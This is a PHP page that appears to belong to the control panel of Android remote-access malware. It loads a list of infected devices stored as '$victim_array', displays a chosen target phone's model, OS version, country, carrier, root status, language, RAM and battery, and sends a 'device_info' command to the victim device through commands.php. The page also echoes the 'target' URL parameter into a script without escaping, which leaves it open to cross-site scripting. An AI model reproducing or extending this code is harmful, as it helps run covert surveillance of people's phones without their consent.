<?php 
require_once 'module_controller.php';
$strJsonFileContents = file_get_contents("../private/storage/device_list.json");
$victim_array = json_decode($strJsonFileContents, true);
$device_id = $_GET['target'];


?>


<div class="row">
        <div class="col-md-11 col-lg-offset-0">
            <div class="well">
                <img id="command-sender-id" name="command-sender-id" src="./images/signal-sender.png" style='height:48px;'/>
                <div class="col-md-10 col-lg-offset-0">
                    <button type="button" id="btn-update-info" name="btn-update-info" class="btn btn-default">Update</button>
                </div>

                <div class="row"></div>
                <br><br>
                <legend>Phone Features</legend>
                <div class="row">
                    <table class="table table-striped table-hover ">
                        <thead>
                        <tr>
                            <th>#</th>
                            <th>Device</th>
                            <th>Details</th>
                        </tr>
                        </thead>
                        <tbody id="contact-content-id">

                        <?php

                        echo '<tr>';
                        echo '<td>1</td>';
                        echo '<td>MODEL</td>';
                        echo '<td>'.strtoupper($victim_array["device_list"][$device_id]['DEVICE_MODEL']).'</td>';
                        echo '</tr>';

                        echo '<tr>';
                        echo '<td>2</td>';
                        echo '<td>VERSION</td>';
                        echo '<td>'.$victim_array["device_list"][$device_id]['SOFTWARE_VERSION'].'</td>';
                        echo '</tr>';

                        echo '<tr>';
                        echo '<td>3</td>';
                        echo '<td>COUNTRY</td>';
                        echo '<td>'.$victim_array["device_list"][$device_id]['COUNTRY'].'</td>';
                        echo '</tr>';

                        echo '<tr>';
                        echo '<td>4</td>';
                        echo '<td>OPERATOR</td>';
                        echo '<td>'.$victim_array["device_list"][$device_id]['SIM_OPERATOR'].'</td>';
                        echo '</tr>';

                        echo '<tr>';
                        echo '<td>5</td>';
                        echo '<td>ROOT</td>';
                        echo '<td>'.$victim_array["device_list"][$device_id]['IS_ROOTED'].'</td>';
                        echo '</tr>';

                        echo '<tr>';
                        echo '<td>6</td>';
                        echo '<td>Dil</td>';
                        echo '<td>'.$victim_array["device_list"][$device_id]['DEVICE_LANGUAGE'].'</td>';
                        echo '</tr>';

                        echo '<tr>';
                        echo '<td>7</td>';
                        echo '<td>Total Ram</td>';
                        echo '<td>'.$victim_array["device_list"][$device_id]['TOTAL_RAM'].'</td>';
                        echo '</tr>';

                        echo '<tr>';
                        echo '<td>8</td>';
                        echo '<td>Charge '.$victim_array["device_list"][$device_id]["CHARGE"].'</td>';
                        echo '<td>
                                <div class="progress progress-striped"> 
                                    <div class="progress-bar progress-bar-info" style="width: '.$victim_array["device_list"][$device_id]['CHARGE'].'"></div>
                                </div>
                              </td>';
                        echo '</tr>';


                        ?>

                        </tbody>
                    </table>

                </div>
                <br><br>
            </div>
        </div>
    </div>

<script>


    $("#command-sender-id").click(function() {
        $.post( "commands.php", { send_command: true, target:"<?php echo $_GET['target'];?>", type: "device_info", value: true}, function( data, err ) {
            if (data.status){
                Toastify({
                    text: "Command sent!",
                    backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
                    className: "info",
                }).showToast();
            } else {
                Toastify({
                    text: "Command failed.!",
                    backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
                    className: "info",
                }).showToast();
            }

        }, "json");

    });


    $("#btn-update-info").click(function() {
        window.location.reload();
    });




</script>
